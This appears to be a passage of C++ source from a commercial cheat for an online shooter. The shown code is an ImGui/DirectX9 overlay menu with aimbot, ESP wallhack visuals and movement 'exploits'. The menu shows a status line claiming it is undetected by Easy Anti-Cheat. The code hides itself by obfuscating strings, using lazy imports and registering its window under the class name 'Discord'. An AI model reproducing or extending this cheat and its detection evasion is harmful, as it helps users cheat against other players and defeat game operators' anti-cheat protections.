		colors[ImGuiCol_FrameBgHovered] = ImVec4(0.12f, 0.20f, 0.28f, 1.00f);
		colors[ImGuiCol_FrameBgActive] = ImVec4(0.09f, 0.12f, 0.14f, 1.00f);
		colors[ImGuiCol_TitleBg] = ImColor(0, 0, 0);//ImVec4(0.09f, 0.12f, 0.14f, 0.65f);
		colors[ImGuiCol_TitleBgActive] = ImColor(0, 0, 0);//ImVec4(0.08f, 0.10f, 0.12f, 1.00f);
		colors[ImGuiCol_TitleBgCollapsed] = ImColor(0, 0, 0);//ImVec4(0.00f, 0.00f, 0.00f, 0.51f);
		colors[ImGuiCol_MenuBarBg] = ImVec4(0.15f, 0.18f, 0.22f, 1.00f);
		colors[ImGuiCol_ScrollbarBg] = ImColor(82, 18, 131);
		colors[ImGuiCol_ScrollbarGrab] = ImColor(0, 0, 0);
		colors[ImGuiCol_ScrollbarGrabHovered] = ImColor(0, 0, 0);
		colors[ImGuiCol_ScrollbarGrabActive] = ImColor(0, 0, 0);
		colors[ImGuiCol_CheckMark] = ImColor(82, 18, 131);//ImVec4(0.28f, 0.56f, 1.00f, 1.00f);
		colors[ImGuiCol_SliderGrab] = ImColor(82, 18, 131);//ImVec4(0.28f, 0.56f, 1.00f, 1.00f);
		colors[ImGuiCol_SliderGrabActive] = ImColor(82, 18, 131);//ImVec4(0.37f, 0.61f, 1.00f, 1.00f);
		colors[ImGuiCol_Button] = ImVec4(0.20f, 0.25f, 0.29f, 1.00f);
		colors[ImGuiCol_ButtonHovered] = ImColor(82, 18, 131);//ImVec4(0.28f, 0.56f, 1.00f, 1.00f);blue
		colors[ImGuiCol_ButtonActive] = ImColor(82, 18, 131);//ImVec4(0.06f, 0.53f, 0.98f, 1.00f);
		colors[ImGuiCol_Header] = ImVec4(0.20f, 0.25f, 0.29f, 0.55f);
		colors[ImGuiCol_HeaderHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.80f);
		colors[ImGuiCol_HeaderActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
		colors[ImGuiCol_Separator] = ImColor(82, 18, 131);//ImVec4(0.20f, 0.25f, 0.29f, 1.00f);
		colors[ImGuiCol_SeparatorHovered] = ImColor(82, 18, 131);//ImVec4(0.10f, 0.40f, 0.75f, 0.78f);
		colors[ImGuiCol_SeparatorActive] = ImColor(82, 18, 131);//ImVec4(0.10f, 0.40f, 0.75f, 1.00f);
		colors[ImGuiCol_ResizeGrip] = ImVec4(0.26f, 0.59f, 0.98f, 0.25f);
		colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.67f);
		colors[ImGuiCol_ResizeGripActive] = ImVec4(0.26f, 0.59f, 0.98f, 0.95f);
		colors[ImGuiCol_Tab] = ImColor(0, 0, 0);//ImVec4(0.11f, 0.15f, 0.17f, 1.00f);
		colors[ImGuiCol_TabHovered] = ImColor(0, 0, 0);//ImVec4(0.0f, 0.68f, 0.93f, 1.00f);
		colors[ImGuiCol_TabActive] = ImColor(0, 0, 0);//ImVec4(0.20f, 0.25f, 0.29f, 1.00f);
		colors[ImGuiCol_TabUnfocused] = ImColor(0, 0, 0);//ImVec4(0.11f, 0.15f, 0.17f, 1.00f);
		colors[ImGuiCol_TabUnfocusedActive] = ImColor(0, 0, 0);//ImVec4(0.11f, 0.15f, 0.17f, 1.00f);
		colors[ImGuiCol_PlotLines] = ImColor(82, 18, 131);//ImVec4(0.61f, 0.61f, 0.61f, 1.00f);
		colors[ImGuiCol_PlotLinesHovered] = ImColor(82, 18, 131);//ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
		colors[ImGuiCol_PlotHistogram] = ImColor(82, 18, 131);//ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
		colors[ImGuiCol_PlotHistogramHovered] = ImColor(82, 18, 131);//ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
		colors[ImGuiCol_TextSelectedBg] = ImColor(82, 18, 131);//ImVec4(0.26f, 0.59f, 0.98f, 0.35f);
		colors[ImGuiCol_DragDropTarget] = ImVec4(1.00f, 1.00f, 0.00f, 0.90f);
		colors[ImGuiCol_NavHighlight] = ImColor(0, 0, 0);//ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
		colors[ImGuiCol_NavWindowingHighlight] = ImColor(0, 0, 0);//ImVec4(1.00f, 1.00f, 1.00f, 0.70f);
		colors[ImGuiCol_NavWindowingDimBg] = ImColor(0, 0, 0);//ImVec4(0.80f, 0.80f, 0.80f, 0.20f);
		colors[ImGuiCol_ModalWindowDimBg] = ImColor(0, 0, 0);//ImVec4(0.80f, 0.80f, 0.80f, 0.35f);

		float
			TextSpaceLine = 90.f,
			SpaceLineOne = 120.f,
			SpaceLineTwo = 280.f,
			SpaceLineThr = 420.f;
		static int maintabs = -1;
		{

			ImGui::SetWindowSize({ 750, 500 });


			ImGui::Begin(ICON_FA_BADGE_DOLLAR"                    Proaids  PegasusCheat Softaim | pegasuscheats.vip                ", 0, ImGuiWindowFlags_::ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_::ImGuiWindowFlags_NoResize | ImGuiWindowFlags_::ImGuiWindowFlags_NoCollapse);


			if (ImGui::Button(ICON_FA_CROSSHAIRS" AIMBOT ", ImVec2(75, 20)))
			{
				maintabs = 0;
			}
			ImGui::SameLine();
			if (ImGui::Button(ICON_FA_EYE" VISUALS ", ImVec2(75, 20)))
			{
				maintabs = 1;
			}
			ImGui::SameLine();
			if (ImGui::Button(ICON_FA_CODE" MISC ", ImVec2(75, 20)))
			{
				maintabs = 2;
			}
			ImGui::SameLine();
			if (ImGui::Button(ICON_FA_BOOK"Info ", ImVec2(75, 20)))
			{
				maintabs = 3;
			}
			ImGui::SameLine();
			if (ImGui::Button(ICON_FA_ANGEL" Colors ", ImVec2(75, 20)))
			{
				maintabs = 4;
			}
			ImGui::Separator();

		}

		if (maintabs == 0)
		{
			ImGui::BeginChild("###One", ImVec2(ImGui::GetContentRegionAvail().x, 280), true);
			{
				ImGui::SetCursorPosX(140);
				ImGui::SetCursorPosX(195);(ICON_FA_CROSSHAIRS"");
				ImGui::Separator();
				ImGui::Checkbox("Aimbot", &Settings::Aimbot);
				ImGui::Checkbox("Aim Prediction", &Settings::Aim_Prediction);
				ImGui::SliderFloat(" Smooth", &Settings::Aim_Speed, 3, 50);
				ImGui::Separator();
				ImGui::SetCursorPosX(110);
				ImGui::SetCursorPosX(195);(ICON_FA_COG"");
				ImGui::Separator();
				ImGui::Text("Draw FOV");
				ImGui::Spacing();
				ImGui::SameLine();
				ImGui::Combo(("##FOVCombo"), &Settings::FOVMode, Settings::FOV_Combo, IM_ARRAYSIZE(Settings::FOV_Combo));
				if (Settings::FOVMode == 0)
				{
					Settings::fnesp = false;
					Settings::Draw_FOV_Circle = true;
				}
				if (Settings::FOVMode == 1)
				{
					Settings::Draw_FOV_Circle = false;

					Settings::fnesp = true;
				}
				ImGui::Spacing();
				ImGui::SameLine();
				ImGui::SliderFloat(" Aim Fov", &Settings::AimFOV, 50, 500);
				ImGui::Text("HitBox");
				ImGui::Spacing();
				ImGui::SameLine();
				ImGui::Combo(("####HitBoxCombo"), &Settings::HitBoxMode, Settings::HitBox_Combo, IM_ARRAYSIZE(Settings::HitBox_Combo));
				if (Settings::HitBoxMode == 0)
				{
					Settings::Head = true;
					Settings::Neck = false;
					Settings::Chest = false;
					Settings::hitbox = 98;
				}
				if (Settings::HitBoxMode == 1)
				{
					Settings::Head = false;
					Settings::Neck = true;
					Settings::Chest = false;
					Settings::hitbox = 66;
				}
				if (Settings::HitBoxMode == 2)
				{
					Settings::Head = false;
					Settings::Neck = false;
					Settings::Chest = true;
					Settings::hitbox = 2;
				}

				ImGui::Text("Aim Keybind");
				ImGui::Spacing();
				ImGui::SameLine();
				HotkeyButton(hotkeys::aimkey, ChangeKey, keystatus);
				ImGui::Checkbox("Controller LT", &Settings::Controller);
				if (Settings::Controller)
				{
					hotkeys::aimkey = false;
				};
				ImGui::Spacing();
				ImGui::SameLine();
				ImGui::EndChild();
			}


		}
		if (maintabs == 1) {
			ImGui::BeginChild("###Two", ImVec2(ImGui::GetContentRegionAvail().x, 210), true);
			{
				ImGui::SetCursorPosX(140);
				ImGui::Text("Visuals");
				ImGui::Separator();
				ImGui::Checkbox("Box ESP", &Settings::Box_Bool);
				ImGui::Checkbox("Skeleton Esp", &Settings::skeleton);
				ImGui::Checkbox("Snaplines", &Settings::Esp_line);
				if (Settings::Box_Bool) {
					Settings::Esp_box = true;
				}
				else {
					Settings::Esp_box = false;
					Settings::Esp_box_fill = false;
					Settings::Esp_Corner_Box = false;
				}
				if (Settings::BoxStyleMode == 0)
				{
					Settings::Esp_box = true;
					Settings::Esp_box_fill = false;
					Settings::Esp_Corner_Box = false;
				}
				if (Settings::BoxStyleMode == 1)
				{
					Settings::Esp_box = false;
					Settings::Esp_box_fill = true;
					Settings::Esp_Corner_Box = false;
				}
				if (Settings::BoxStyleMode == 2)
				{
					Settings::Esp_box = false;
					Settings::Esp_box_fill = false;
					Settings::Esp_Corner_Box = true;
				}
				ImGui::Separator();
				ImGui::SetCursorPosX(110);
				ImGui::Text("Visuals Settings");
				ImGui::Separator();
				ImGui::Text("Box Style");
				ImGui::Spacing();
				ImGui::SameLine();
				ImGui::Combo(("####BoxStyleCombo"), &Settings::BoxStyleMode, Settings::BoxStyle_Combo, IM_ARRAYSIZE(Settings::BoxStyle_Combo));
				ImGui::Text("Esp Distance");
				ImGui::Spacing();
				ImGui::SameLine();
				ImGui::SliderFloat(" ", &Settings::VisDist, 100, 250);
				ImGui::EndChild();
			}

		}

		if (maintabs == 2)
		{
			ImGui::SetCursorPosX(140);
			ImGui::Text("Exploits");
			ImGui::Separator();
			ImGui::Checkbox("CrossHair", &Settings::cross_hair);
			ImGui::Checkbox(E("ADS in Air"), &Settings::ADSinAir);
			ImGui::Checkbox("Skip Knocked Player", &Settings::SkipKnocked);
			ImGui::Checkbox("Car Fly UD", &Settings::g_carfly);
			ImGui::Checkbox("Double Pump - TESTING", &Settings::g_doublepump);
			ImGui::Checkbox("Player Fly - TESTING", &Settings::g_playerfly);
			ImGui::Checkbox("Insta Revive - TESTING", &Settings::g_instarev);
			
			
			
			if (ImGui::Button(ICON_FA_SAVE "  SAVE CONFIG", ImVec2(140, 25)))
			{
				LI_FN(Sleep)(500);
				SaveConfig();
			}

			if (ImGui::Button(ICON_FA_SAVE "  LOAD CONFIG", ImVec2(140, 25)))
			{
				LI_FN(Sleep)(500);
				LoadConfig();
			}
			

		}

		if (maintabs == 3)
		{
			ImGui::Text(("Overlay Frametime:  %.1f FPS"), ImGui::GetIO().Framerate);
			ImGui::TextColored(ImColor(0, 255, 55), "Status: UD EAC");
			ImGui::Text(("Version: 1.4"));
		}
	
	if (maintabs == 4)
	{
		ImGui::Text((E("2D Box Colour:")));
	bool open_popup4 = ImGui::ColorButton(E("##CornerBoxColour"), *(ImVec4*)&Settings::BoxCornerESP, ImGuiColorEditFlags_HDR | ImGuiColorEditFlags_NoDragDrop | ImGuiColorEditFlags_AlphaPreviewHalf | ImGuiColorEditFlags_AlphaPreview | ImGuiColorEditFlags_NoOptions);
	if (open_popup4)
	{
		ImGui::OpenPopup(E("Corner Box Colour"));
	}
	if (ImGui::BeginPopup(E("Corner Box Colour")))
	{
		ImGui::ColorPicker4(E("##CornerBoxColour"), (float*)&Settings::BoxCornerESP, ImGuiColorEditFlags_HDR | ImGuiColorEditFlags_NoDragDrop | ImGuiColorEditFlags_AlphaPreviewHalf | ImGuiColorEditFlags_AlphaPreview | ImGuiColorEditFlags_NoOptions | ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_NoSmallPreview);
		ImGui::EndPopup();
	}
	ImGui::Text((E("Corner Box Colour: ")));
	bool open_popup1 = ImGui::ColorButton(E("##123"), *(ImVec4*)&Settings::CornerCOL, ImGuiColorEditFlags_HDR | ImGuiColorEditFlags_NoDragDrop | ImGuiColorEditFlags_AlphaPreviewHalf | ImGuiColorEditFlags_AlphaPreview | ImGuiColorEditFlags_NoOptions);
	if (open_popup1)
	{
		ImGui::OpenPopup(E("CornerBox"));
	}
	if (ImGui::BeginPopup(E("CornerBox")))
	{
		ImGui::ColorPicker4(E("##123"), (float*)&Settings::CornerCOL, ImGuiColorEditFlags_HDR | ImGuiColorEditFlags_NoDragDrop | ImGuiColorEditFlags_AlphaPreviewHalf | ImGuiColorEditFlags_AlphaPreview | ImGuiColorEditFlags_NoOptions | ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_NoSmallPreview);
		ImGui::EndPopup();
	}
	ImGui::Text((E("Skeleton Colour: ")));
	bool open_popup12 = ImGui::ColorButton(E("##1234"), *(ImVec4*)&Settings::SkeletonESP, ImGuiColorEditFlags_HDR | ImGuiColorEditFlags_NoDragDrop | ImGuiColorEditFlags_AlphaPreviewHalf | ImGuiColorEditFlags_AlphaPreview | ImGuiColorEditFlags_NoOptions);
	if (open_popup12)
	{
		ImGui::OpenPopup(E("SColour"));
	}
	if (ImGui::BeginPopup(E("SColour")))
	{
		ImGui::ColorPicker4(E("##1234"), (float*)&Settings::SkeletonESP, ImGuiColorEditFlags_HDR | ImGuiColorEditFlags_NoDragDrop | ImGuiColorEditFlags_AlphaPreviewHalf | ImGuiColorEditFlags_AlphaPreview | ImGuiColorEditFlags_NoOptions | ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_NoSmallPreview);
		ImGui::EndPopup();
	}
	ImGui::Text((E("Snaplines Colour: ")));
	bool open_popup1233 = ImGui::ColorButton(E("##12344"), *(ImVec4*)&Settings::LineCol, ImGuiColorEditFlags_HDR | ImGuiColorEditFlags_NoDragDrop | ImGuiColorEditFlags_AlphaPreviewHalf | ImGuiColorEditFlags_AlphaPreview | ImGuiColorEditFlags_NoOptions);
	if (open_popup1233)
	{
		ImGui::OpenPopup(E("SNColour"));
	}
	if (ImGui::BeginPopup(E("SNColour")))
	{
		ImGui::ColorPicker4(E("##12344"), (float*)&Settings::LineCol, ImGuiColorEditFlags_HDR | ImGuiColorEditFlags_NoDragDrop | ImGuiColorEditFlags_AlphaPreviewHalf | ImGuiColorEditFlags_AlphaPreview | ImGuiColorEditFlags_NoOptions | ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_NoSmallPreview);
		ImGui::EndPopup();
	}

}
		ImGui::End();
	}
	//end
	DrawESP();

	ImGui::EndFrame();
	D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
	D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

	if (D3dDevice->BeginScene() >= 0)
	{
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		D3dDevice->EndScene();
	}
	HRESULT result = D3dDevice->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
	{
		ImGui_ImplDX9_InvalidateDeviceObjects();
		D3dDevice->Reset(&d3dpp);
		ImGui_ImplDX9_CreateDeviceObjects();
	}
}

MSG Message = { NULL };



void xMainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();

		if (hwnd_active == hwnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(hwnd, &rc);
		ClientToScreen(hwnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = hwnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{
			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			d3dpp.BackBufferWidth = Width;
			d3dpp.BackBufferHeight = Height;
			SetWindowPos(Window, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			D3dDevice->Reset(&d3dpp);
		}
		render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	DestroyWindow(Window);
}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		xShutdown();
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			d3dpp.BackBufferWidth = LOWORD(lParam);
			d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = D3dDevice->Reset(&d3dpp);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}

void xShutdown()
{
	TriBuf->Release();
	D3dDevice->Release();
	p_Object->Release();

	DestroyWindow(Window);
	UnregisterClass(L"Discord", NULL);
}


